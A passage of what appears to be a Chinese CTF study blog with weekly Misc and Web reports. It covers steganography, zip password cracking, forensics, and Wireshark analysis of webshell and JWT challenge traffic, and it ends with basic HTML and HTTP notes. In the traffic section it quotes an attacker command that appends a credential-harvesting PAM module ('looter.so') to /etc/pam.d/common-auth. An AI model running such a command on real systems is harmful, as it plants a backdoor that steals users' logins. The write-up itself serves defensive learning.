class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"> </span><br><span class="line">x = <span class="number">200</span>  <span class="comment"># width    #x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">200</span>  <span class="comment"># height    #y坐标  x * y = 行数</span></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))  <span class="comment"># 创建图片</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./resource/rgb.txt&#x27;</span>)  <span class="comment"># 打开rbg值的文件</span></span><br><span class="line"><span class="comment"># 通过每个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  <span class="comment"># 获取一行的rgb值</span></span><br><span class="line">        rgb = line.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip().split(<span class="string">&#x27;,&#x27;</span>)  <span class="comment"># 分离rgb</span></span><br><span class="line">        im.putpixel((i, j), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))  <span class="comment"># 将rgb转化为像素</span></span><br><span class="line"> </span><br><span class="line">im.save(<span class="string">&quot;./resource/flag.jpg&quot;</span>)  <span class="comment"># im.save(&#x27;flag.jpg&#x27;)保存为jpg图片</span></span><br></pre></td></tr></table></figure><p>得到一张二维码，扫描得到flag</p><h4 id="题目：百里挑一"><a href="#题目：百里挑一" class="headerlink" title="题目：百里挑一"></a>题目：百里挑一</h4><p>解压附件，打开</p><p>流量分析题目，用wireshark打开流量包。根据题目提示，其中应该有很多的壁纸图片。尝试导出HTTP，全部保存在一个文件夹里面</p><p>使用<code>exiftool *|grep flag</code>得到一半的flag：</p><p><img src="https://pic1.imgdb.cn/item/67d2bd4f88c538a9b5bc814e.png" alt=""></p><p>还有一半则是在流量包里面：</p><p><img src="https://pic1.imgdb.cn/item/67d2bdca88c538a9b5bc8171.png" alt=""></p><p>最终flag：</p><p>flag{ae58d0408e26e8f26a3c0589d23edeec}</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>针对本次的TPCTF比赛的话，第一道二维码还是比较简单的，运用PS把扭曲的二维码扶正后，其实可以尝试利用QRazyBox集成的工具进行修复，而不是手动修复，耗时耗力（借鉴了其他队的WP）</p><p>其次就是spam这道题目，完全没有想到IP地址上面，反而以为是Web方面的知识（那个输入框太误导人了！）当时也没有环境去试不同的IP地址。</p><p>后面较难的题暂且不论了。。。</p><p>然后就是本周的做题，主要以流量分析为主，学习了一下工业生产流量。这种题还是太少了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc周报02</title>
      <link href="/2025/03/01/misc%E5%91%A8%E6%8A%A502/"/>
      <url>/2025/03/01/misc%E5%91%A8%E6%8A%A502/</url>
      
        <content type="html"><![CDATA[<h1 id="misc周报02"><a href="#misc周报02" class="headerlink" title="misc周报02"></a>misc周报02</h1><p><strong><em>【为者常成，行者常至。            ——《晏子春秋》】</em></strong></p><h3 id="本周流量分析专题练习"><a href="#本周流量分析专题练习" class="headerlink" title="本周流量分析专题练习"></a>本周流量分析专题练习</h3><p><strong><em><del>（源自NSSCTF的流量分析题）</del></em></strong></p><h4 id="题目：-陇剑杯-2021-webshell"><a href="#题目：-陇剑杯-2021-webshell" class="headerlink" title="题目：[陇剑杯 2021]webshell"></a>题目：[陇剑杯 2021]webshell</h4><p><img src="https://pic1.imgdb.cn/item/67c956ce066befcec6deea73.png" alt=""></p><p>进行追踪流，在第六个流中找到登录账号密码：</p><p><img src="https://pic1.imgdb.cn/item/67c958dd066befcec6deebb6.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67c958f1066befcec6deebe0.png" alt=""></p><p><strong>Admin123!@#</strong></p><h4 id="题目：-陇剑杯-2021-jwt系列（问1——问6）"><a href="#题目：-陇剑杯-2021-jwt系列（问1——问6）" class="headerlink" title="题目：[陇剑杯 2021]jwt系列（问1——问6）"></a>题目：[陇剑杯 2021]jwt系列（问1——问6）</h4><h5 id="问1："><a href="#问1：" class="headerlink" title="问1："></a>问1：</h5><p><img src="https://pic1.imgdb.cn/item/67c9792d066befcec6df1b56.png" alt=""></p><p>追踪HTTP流，发现token</p><p><img src="https://pic1.imgdb.cn/item/67c97a0c066befcec6df1b82.png" alt=""></p><p>base64解码后，typ=jwt</p><p><img src="https://pic1.imgdb.cn/item/67c97a81066befcec6df1b8a.png" alt=""></p><p>(题目是jwt 当然是jwt认证方式……)</p><h5 id="问2："><a href="#问2：" class="headerlink" title="问2："></a>问2：</h5><p><img src="https://pic1.imgdb.cn/item/67c95983066befcec6deeca3.png" alt=""></p><p>分析：JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。<br> 所以只要找到jwt解密即可。</p><p>通过分析数据包发现有个exec的命令执行成功，查看cookie</p><p><img src="https://pic1.imgdb.cn/item/67c95ad7066befcec6deef4c.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67c95b1a066befcec6deefc3.png" alt=""></p><p>进行解码：</p><p><img src="https://pic1.imgdb.cn/item/67c95c68066befcec6def142.png" style="zoom:50%;" /></p><p>解码后id为10087，username为admin</p><h5 id="问3："><a href="#问3：" class="headerlink" title="问3："></a>问3：</h5><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250306183700211.png" alt="image-20250306183700211"></p><p>http contains “whoami” 命令查找http协议中包含whoami的流量包<br>查看http流中的回显，得到权限信息</p><p><img src="https://pic1.imgdb.cn/item/67c97c52066befcec6df1be8.png" alt=""></p><p>root权限</p><h5 id="问4："><a href="#问4：" class="headerlink" title="问4："></a>问4：</h5><p><img src="https://pic1.imgdb.cn/item/67c97cef066befcec6df1c05.png" alt=""></p><p>过滤“POST”数据包，一个一个流分析</p><p>发现通过echo将base64加密的内容写进了文件内：</p><p><img src="https://pic1.imgdb.cn/item/67c97e3d066befcec6df1c1f.png" alt=""></p><p>尝试解密查看，确实为恶意代码：</p><p><img src="C:\Users\31715\AppData\Roaming\Typora\typora-user-images\image-20250306185308193.png" alt="image-20250306185308193"></p><p>所以文件名称为1.c</p><h5 id="问5："><a href="#问5：" class="headerlink" title="问5："></a>问5：</h5><p><img src="https://pic1.imgdb.cn/item/67c97ec1066befcec6df1c2c.png" alt=""></p><p>要找到so文件，使用http contains “.so”过滤指定字符串：</p><p><img src="https://pic1.imgdb.cn/item/67c97f07066befcec6df1c32.png" alt=""></p><p>在最后一个数据包中找到文件</p><h5 id="问6："><a href="#问6：" class="headerlink" title="问6："></a>问6：</h5><p><img src="https://pic1.imgdb.cn/item/67c98026066befcec6df1c4a.png" alt=""></p><p>因为给的是黑客攻击流量，所有http的请求方法应该为“POST”，且Liunx系统下配置文件放在etc目录下，故筛选代码如下:http.request.method==“POST”&amp;&amp;http contains “etc”</p><p><img src="https://pic1.imgdb.cn/item/67c9811b066befcec6df1c9b.png" alt=""></p><p>echo “auth optional  looter.so”&gt;&gt;/etc/pam.d/common-auth</p><p>意为：向/etc/pam.d/common-auth文件追加一行内容，内容为auth optional looter.so，故文件路径为/etc/pam.d/common-auth</p><h3 id="本周取证专题练习（NSSCTF）"><a href="#本周取证专题练习（NSSCTF）" class="headerlink" title="本周取证专题练习（NSSCTF）"></a>本周取证专题练习（NSSCTF）</h3><p><strong><em><del>（源自NSSCTF的取证题）</del></em></strong></p><hr><h4 id="题目：-蓝帽杯-2022-初赛-计算机取证-3"><a href="#题目：-蓝帽杯-2022-初赛-计算机取证-3" class="headerlink" title="题目：[蓝帽杯 2022 初赛]计算机取证_3"></a>题目：[蓝帽杯 2022 初赛]计算机取证_3</h4><p>题目：</p><p><img src="https://pic1.imgdb.cn/item/67c94e69066befcec6dee00b.png" alt=""></p><p>使用passware结合内存找BitLocker密码（太好用了）</p><p><img src="https://pic1.imgdb.cn/item/67c94dfb066befcec6dedf23.png" alt=""></p><p>用FTk Imager挂载解密后的镜像：</p><p><img src="https://pic1.imgdb.cn/item/67c94e42066befcec6dedfc7.png" alt=""></p><p>根据题目信息，flag应该在pptx或docx中间：</p><p>使用给的密码本进行字典爆破：</p><p><img src="https://pic1.imgdb.cn/item/67c950ce066befcec6dee3b2.png" alt=""></p><p>拿到ppt的密码，打开后，获得flag</p><p><img src="https://pic1.imgdb.cn/item/67c95143066befcec6dee3ec.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b27867b66866866686866883bb43536&#125;</span><br></pre></td></tr></table></figure><h3 id="buuCTF-misc部分题目记录"><a href="#buuCTF-misc部分题目记录" class="headerlink" title="buuCTF misc部分题目记录"></a>buuCTF misc部分题目记录</h3><hr><h4 id="题目：-安洵杯-2019-吹着贝斯扫二维码"><a href="#题目：-安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="题目：[安洵杯 2019]吹着贝斯扫二维码"></a>题目：[安洵杯 2019]吹着贝斯扫二维码</h4><p>打开题目，里面是一堆文件和一个压缩包。</p><p><img src="https://pic1.imgdb.cn/item/67c58f29d0e0a243d40ad6fa.png" alt=""></p><p>分析文件，发现都是jpg图片</p><p><img src="https://pic1.imgdb.cn/item/67c58f73d0e0a243d40ad722.png" alt=""></p><p>因此需要给每个文件添加后缀名：</p><p>使用python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#将无后缀的文件加上.jpg</span></span><br><span class="line">dir_list = os.listdir(<span class="string">&#x27;C:/Users/31715/Desktop/tt&#x27;</span>)</span><br><span class="line"><span class="comment">#print(dir_list)</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> dir_list:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># print(file)</span></span><br><span class="line">        os.rename(file, file+<span class="string">&#x27;.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到二维码碎片，我们需要将其拼装起来：</p><p><img src="https://pic1.imgdb.cn/item/67c59381d0e0a243d40adbc4.png" alt=""></p><p>扫描二维码：</p><p><img src="https://pic1.imgdb.cn/item/67c5941fd0e0a243d40adbeb.png" alt=""></p><p>base系列，85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32加密</p><p>这里指的应该是压缩包里面的内容：</p><p><img src="https://pic1.imgdb.cn/item/67c59483d0e0a243d40adbfe.png" alt=""></p><p>倒过来进行解密：</p><p><em>strings:</em> </p><p>GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY</p><p><em>base32_decode:</em> </p><p>3A715D3E574E36326F733C5E625D213B2C62652E3D6E3B7640392F3137274038624148</p><p><em>base16_decode:</em> </p><p>:q]&gt;WN62os&lt;^b]!;,be.=n;v@9/17’@8bAH</p><p><em>Rot13_decode:</em> </p><p>:d]&gt;JA62bf&lt;^o]!;,or.=a;i@9/17’@8oNU</p><p><em>base85_decode:</em> </p><p>PCtvdWU4VFJnQUByYy4mK1lraTA=</p><p><em>base64_decode:</em> </p><p>&lt;+oue8TRgA@rc.&amp;+Yki0</p><p><em>base85_decode:</em> </p><p>ThisIsSecret!233</p><p>解压一下，flag{Qr_Is_MeAn1nGfuL}</p><h4 id="题目：从娃娃抓起"><a href="#题目：从娃娃抓起" class="headerlink" title="题目：从娃娃抓起"></a>题目：从娃娃抓起</h4><p><img src="https://pic1.imgdb.cn/item/67c834dcd0e0a243d40cc65e.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67c834c4d0e0a243d40cc657.png" alt=""></p><p>根据题目描述，两行字符分别是两种不同的汉字编码。</p><p>经过分析，第一行为电报码：</p><p><img src="https://pic1.imgdb.cn/item/67c8360cd0e0a243d40cca8b.png" alt=""></p><p>解码后为人工智能</p><p>第二行是五笔编码：</p><p><img src="https://pic1.imgdb.cn/item/67c8364cd0e0a243d40cca9a.png" alt=""></p><p>解码为也要从娃娃抓起</p><p>将其链接在一起，按照题目要求求小写MD5：</p><p><img src="https://pic1.imgdb.cn/item/67c836bdd0e0a243d40ccac4.png" alt=""></p><p>得到flag！</p><h4 id="题目：弱口令"><a href="#题目：弱口令" class="headerlink" title="题目：弱口令"></a>题目：弱口令</h4><p><img src="https://pic1.imgdb.cn/item/67c93b8b066befcec6dec043.png" alt=""></p><p>打开题目，发现压缩包里面有隐藏信息：</p><p>复制到sublime，看到隐藏信息（这一步看了WP，没想到）</p><p><img src="https://pic1.imgdb.cn/item/67c93d48066befcec6dec3ad.png" alt=""></p><p>这应该就是压缩包的密码！</p><p>尝试解压：</p><p>里面是一张图片。</p><p>分析，lsb隐写。</p><p><img src="https://pic1.imgdb.cn/item/67c93dd6066befcec6dec53d.png" alt=""></p><h4 id="题目：-GUET-CTF2019-zips"><a href="#题目：-GUET-CTF2019-zips" class="headerlink" title="题目：[GUET-CTF2019]zips"></a>题目：[GUET-CTF2019]zips</h4><p>压缩包系列解密。</p><p>第一个压缩包，没有提示信息，直接暴力破解：</p><p><img src="https://pic1.imgdb.cn/item/67c93e9d066befcec6dec6a2.png" alt=""></p><p>第二个压缩包，发现flag.zip可以解压出来，但是setup.sh不能解压出来，setup.sh显示压缩文件头部数据已经损坏</p><p>这里很有可能存在zip伪加密。那现在我想的是先将它拿到kali中binwalk检测一下。</p><p><img src="https://pic1.imgdb.cn/item/67c94131066befcec6decc21.png" alt=""></p><p>两个zip，一个是flag.zip而一个是装的是setup.sh；那很可能是flag.zip没有被加密，而setup.sh对应的那个zip被伪加密了所以才导致无法直接把setup.sh解压缩出来。此时可以考虑通过binwalk直接将它们分离，可能可以直接得到setup.sh文件。</p><p><img src="https://pic1.imgdb.cn/item/67c94317066befcec6decf11.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67c942e3066befcec6decf03.png" alt=""></p><p>伪加密修复后，再进行解压，这时候可以查看setup.sh的内容：</p><p><img src="https://pic1.imgdb.cn/item/67c94366066befcec6decf1f.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash: 这是一个Shebang行，指定了该脚本应使用/bin/bash解释器执行。它是Unix/Linux系统中可执行脚本的标准起始行。</span><br><span class="line"></span><br><span class="line">zip -e --password=: 这部分命令调用了zip程序来创建或更新一个ZIP归档文件，并使用-e选项指明需要对存档中的文件进行加密。</span><br><span class="line"></span><br><span class="line">python -c &quot;print(__import__(&#x27;time&#x27;).time())&quot;: 这里嵌入了一个Python命令，用于执行一段Python代码。具体来说，它导入了time模块，并调用其time()函数来获取当前的Unix时间戳。这个时间值将作为接下来操作的密码。</span><br><span class="line"></span><br><span class="line">flag.zip flag: 表示要创建或更新的ZIP文件名为flag.zip，并且要将当前目录下的一个名为flag的文件添加到此ZIP文件中。由于前面设置了-e和--password，所以在添加过程中会对flag文件进行加密，并使用由Python计算出的时间戳作为加密密码。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段脚本是用Bash编写的，其主要功能是使用Python计算当前时间（以Unix时间戳形式表示，即从1970年1月1日00:00:00 UTC以来的秒数）并以此时间为密码来加密一个名为<code>flag.zip</code>的ZIP文件，其中包含一个名为<code>flag</code>的文件。</p><p><img src="https://pic1.imgdb.cn/item/67c9445c066befcec6ded20a.png" style="zoom:33%;" /></p><p>16:40:15，那么可以通过以下python代码获得此时的unix时间戳：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">t_str = <span class="string">&#x27;2019-5-17 16:40:15&#x27;</span>   </span><br><span class="line">t_tuple = time.strptime(t_str, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)     </span><br><span class="line">t_unix = time.mktime(t_tuple)   </span><br><span class="line"><span class="built_in">print</span>(t_unix)</span><br><span class="line"><span class="comment"># 输出结果：1558082415.0</span></span><br></pre></td></tr></table></figure><p>通过上述我们得到了其创建flag.zip的时候对应时间的unix时间戳，但这不代表我们就获得了密码，现在目光需要重新回到setup.sh文件，在kali中执行其中的python代码，这是因为作者在创建flag.zip文件的时候一定是在linux中执行的setup.sh脚本：</p><p>而python2和python3的时间戳格式是不一样的（这里是python2，为什么呢？因为看了WP……🙄）</p><p>引用一下其中的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以看到通过python2执行后，获得的unix时间戳的小数位数都是两位，那么到底是python2还是python3呢，这里我觉得就只有凭经验判断了，在以前写的工具或者exp之类的东西大都是通过python2写的，所以这里可以优先考虑python2，python2不行再换python3。</span><br><span class="line">————————————————</span><br><span class="line">                        </span><br><span class="line">原文链接：https://blog.csdn.net/weixin_62248541/article/details/142741438</span><br></pre></td></tr></table></figure><p>截取其中的<code>print(__import__(&#39;time&#39;).time())</code>python代码，在Python2环境下运行，得到时间戳格式</p><p>知道格式后，就可以利用掩码爆破爆破出密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以以1558080000.00为开始，以1558089999.99为结束来进行掩码爆破，这样可以极大提高密码破解的效率。至于我怎么得到这个范围了，因为有误差所以只能靠猜了，因为以上两个时间分别对应的是2019.5.17 16.40.00和2019.5.17 17.00.00，它们对应的unix时间戳前半部分都是155808，所以我就让前半部分不变，然后对后面进行掩码爆破。</span><br><span class="line">——————————————                         </span><br><span class="line">原文链接：https://blog.csdn.net/weixin_62248541/article/details/142741438</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67c94814066befcec6ded888.png" alt=""></p><p>解压拿到flag！</p><h3 id="学习总结："><a href="#学习总结：" class="headerlink" title="学习总结："></a>学习总结：</h3><hr><p>本周主要做题为主，misc的大部分题目在buu上面做题，取证和流量分析则是通过NSSCTF进行查找并做题。</p><p>计划是通过做题来找寻涉及的知识点，而后对其进行学习，主要以流量分析和取证为主。目前感觉流量分析技能十分欠缺，web知识很缺乏，做题离不开WP。计划结合对WEB的学习，一点点掌握流量分析技巧，下周准备大批量做流量题。</p><p>然后就是，基础的misc，包括各种的隐写什么的，感觉还应该多做题，熟练度不够。</p><p>👀👀</p><h3 id="知识点总结："><a href="#知识点总结：" class="headerlink" title="知识点总结："></a>知识点总结：</h3><h4 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h4><p>组成：</p><p>JWT由三部分组成，通常这三部分通过点（.）连接，格式为xxxx.yyyy.zzzz。</p><pre><code>Header（头部）：通常包含两部分信息：token的类型（例如JWT）和所使用的签名算法（如HMAC SHA256或RSA）。Payload（负载）：包含声明（claims），这些声明是关于实体（通常是用户）和其他数据的声明。声明有三种类型：    Registered claims：预定义的字段，如iss（发行者）、exp（过期时间）、sub（主题）等。    Public claims：公共的claims，可以随意定义，但为了避免冲突，应该使用IANA JSON Web Token URL。    Private claims：私有的claims，用于在同意使用JWT的各方之间共享信息。Signature（签名）：用于验证该token自签发后未被更改。它使用header中指定的算法和服务器端的密钥（secret key或公钥）与header、payload一起计算得出。</code></pre><p>工作原理：</p><pre><code>生成Token：当用户登录时，服务器使用用户的凭据生成一个JWT。这个过程中，服务器会创建一个payload，其中包括用户的ID和其他相关信息，然后用一个密钥（密钥可以是共享的secret key或私钥）和一个特定的算法对头部和负载进行签名。传输Token：生成的JWT被发送给客户端，通常是通过HTTP响应头中的Authorization字段。验证Token：每次客户端请求需要验证用户身份的资源时，它都会在请求中携带这个JWT。服务器接收到请求后，会验证JWT的签名是否有效，以及token是否未过期等。如果验证通过，服务器就可以信任该token中的信息，如用户的身份和权限等。</code></pre><p>安全性：</p><p>JWT的安全性依赖于其签名机制。只要密钥保持安全，JWT就可以被认为是安全的。然而，需要注意的是，虽然JWT可以被签名以防止篡改，但不应该在JWT的payload中存储敏感信息，因为任何人都可以解码查看payload中的内容（除非使用加密手段）。</p><p>使用场景：</p><p>JWT常用于API的身份验证和授权中，因为它可以跨域传输且易于在不同的系统间共享身份信息。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web周报01</title>
      <link href="/2025/03/01/web%E5%91%A8%E6%8A%A501/"/>
      <url>/2025/03/01/web%E5%91%A8%E6%8A%A501/</url>
      
        <content type="html"><![CDATA[<h1 id="Web周报01"><a href="#Web周报01" class="headerlink" title="Web周报01"></a>Web周报01</h1><p><strong><em>【百丈之台，其始则一石耳，由是而二石焉，由是而三石，四石以至于千万石焉。领悟亦然。今日记一事，明日悟一理，积久而成学。——毛泽东】</em></strong></p><h3 id="1-前置任务进度"><a href="#1-前置任务进度" class="headerlink" title="1.前置任务进度"></a>1.前置任务进度</h3><ol><li><p>所需工具，插件，环境等已全部部署</p></li><li><p><strong><code>计算机网络</code></strong>的学习进度：</p><p>已学习 <strong>网络协议，计算机网络结构，Internet结构，电路交换，多路复用……</strong>等内容</p><p>相关学习笔记发布在本人博客：</p><p><a href="https://www.czxh.top/2025/02/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.czxh.top/2025/02/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p></li><li><p><code>Linux基础</code>学习进度：</p><p>已掌握基本的操作。</p></li></ol><h3 id="2-网站学习日志"><a href="#2-网站学习日志" class="headerlink" title="2.网站学习日志"></a>2.网站学习日志</h3><p><em>目标：从一个网站入手，了解用户看到的前端页面是怎么组成的，再到是如何去和服务器后端进行连接和交互（发包的那些内容都去了哪，为什么会返回不同的响应）</em></p><h4 id="构成前端的基础（三件套）："><a href="#构成前端的基础（三件套）：" class="headerlink" title="构成前端的基础（三件套）："></a><strong>构成前端的基础（三件套）：</strong></h4><p><strong>HTML（结构层）</strong></p><ul><li><p><strong>作用</strong>：定义页面的内容和结构（如标题、段落、按钮等）。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">    &lt;button&gt;点击我&lt;/button&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>运行 HTML</p></li></ul><p><strong>CSS（样式层）</strong></p><ul><li><p><strong>作用</strong>：控制页面的外观（颜色、布局、动画等）。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1 &#123; color: blue; &#125;</span><br><span class="line">button &#123; background: orange; &#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>JavaScript（行为层）</strong></p><ul><li><p><strong>作用</strong>：实现动态交互（如点击事件、数据加载、动画逻辑）。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector(&#x27;button&#x27;).addEventListener(&#x27;click&#x27;, () =&gt; &#123;</span><br><span class="line">  alert(&#x27;按钮被点击了！&#x27;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><h4 id="如何去和服务器后端进行连接和交互——HTTP-请求"><a href="#如何去和服务器后端进行连接和交互——HTTP-请求" class="headerlink" title="如何去和服务器后端进行连接和交互——HTTP 请求"></a>如何去和服务器后端进行连接和交互——HTTP 请求</h4><h5 id="一、HTTP-请求的核心组成"><a href="#一、HTTP-请求的核心组成" class="headerlink" title="一、HTTP 请求的核心组成"></a><strong>一、HTTP 请求的核心组成</strong></h5><p><strong>1. 请求方法（HTTP Methods）</strong></p><p>定义客户端希望执行的操作类型：</p><ul><li><strong>GET</strong>：获取资源（如加载网页、查询数据）。</li><li><strong>POST</strong>：提交数据（如表单提交、创建资源）。</li><li><strong>PUT</strong>：更新整个资源。</li><li><strong>PATCH</strong>：部分更新资源。</li><li><strong>DELETE</strong>：删除资源。</li><li><strong>HEAD</strong>：获取资源的元信息（不返回内容）。</li><li><strong>OPTIONS</strong>：查询服务器支持的请求方法（常用于 CORS 预检）。</li></ul><p><strong>2. 请求头（Request Headers）</strong></p><p>携带请求的元信息，常见字段：</p><div class="table-container"><table><thead><tr><th>请求头字段</th><th>作用</th></tr></thead><tbody><tr><td><code>Host</code></td><td>目标服务器的域名（必填）。</td></tr><tr><td><code>User-Agent</code></td><td>客户端标识（如浏览器类型）。</td></tr><tr><td><code>Accept</code></td><td>声明客户端可接收的响应格式（如 <code>application/json</code>）。</td></tr><tr><td><code>Content-Type</code></td><td>请求体的数据类型（如 <code>application/json</code>、<code>multipart/form-data</code>）。</td></tr><tr><td><code>Authorization</code></td><td>身份凭证（如 <code>Bearer token</code>）。</td></tr><tr><td><code>Cookie</code></td><td>客户端存储的会话信息。</td></tr><tr><td><code>Referer</code></td><td>当前请求的来源页面 URL。</td></tr><tr><td><code>Cache-Control</code></td><td>缓存策略（如 <code>no-cache</code>）。</td></tr></tbody></table></div><p><strong>3. 请求体（Request Body）</strong></p><p>用于 <code>POST</code>、<code>PUT</code>、<code>PATCH</code> 等方法的附加数据。<br><strong>常见格式</strong>：</p><ul><li><strong>JSON</strong>：<code>&#123; &quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 25 &#125;</code></li><li><strong>表单数据</strong>：<code>name=Alice&amp;age=25</code></li><li><strong>文件上传</strong>：<code>multipart/form-data</code></li></ul><h5 id="二、HTTP-响应的核心组成"><a href="#二、HTTP-响应的核心组成" class="headerlink" title="二、HTTP 响应的核心组成"></a><strong>二、HTTP 响应的核心组成</strong></h5><p><strong>1. 状态码（Status Codes）</strong></p><p>表示请求处理结果的三位数字代码：</p><div class="table-container"><table><thead><tr><th>状态码</th><th>类别</th><th>常见示例</th></tr></thead><tbody><tr><td>1xx</td><td>信息响应</td><td>100（继续）、101（切换协议）</td></tr><tr><td>2xx</td><td>成功响应</td><td><strong>200（OK）</strong>、201（已创建）、204（无内容）</td></tr><tr><td>3xx</td><td>重定向</td><td>301（永久重定向）、302（临时重定向）、304（缓存未修改）</td></tr><tr><td>4xx</td><td>客户端错误</td><td><strong>400（请求错误）</strong>、401（未授权）、403（禁止访问）、404（未找到资源）</td></tr><tr><td>5xx</td><td>服务器错误</td><td><strong>500（内部错误）</strong>、502（网关错误）、503（服务不可用）</td></tr></tbody></table></div><p><strong>2. 响应头（Response Headers）</strong></p><p>服务器返回的元信息，常见字段：</p><div class="table-container"><table><thead><tr><th>响应头字段</th><th>作用</th></tr></thead><tbody><tr><td><code>Content-Type</code></td><td>响应体的数据类型（如 <code>text/html</code>、<code>application/json</code>）。</td></tr><tr><td><code>Content-Length</code></td><td>响应体的字节长度。</td></tr><tr><td><code>Cache-Control</code></td><td>缓存策略（如 <code>max-age=3600</code>）。</td></tr><tr><td><code>Set-Cookie</code></td><td>服务器设置客户端的 Cookie。</td></tr><tr><td><code>Access-Control-Allow-Origin</code></td><td>允许跨域请求的域名（CORS 相关）。</td></tr><tr><td><code>Location</code></td><td>重定向的目标 URL（用于 3xx 状态码）。</td></tr></tbody></table></div><p><strong>3. 响应体（Response Body）</strong></p><p>服务器返回的实际内容，格式由 <code>Content-Type</code> 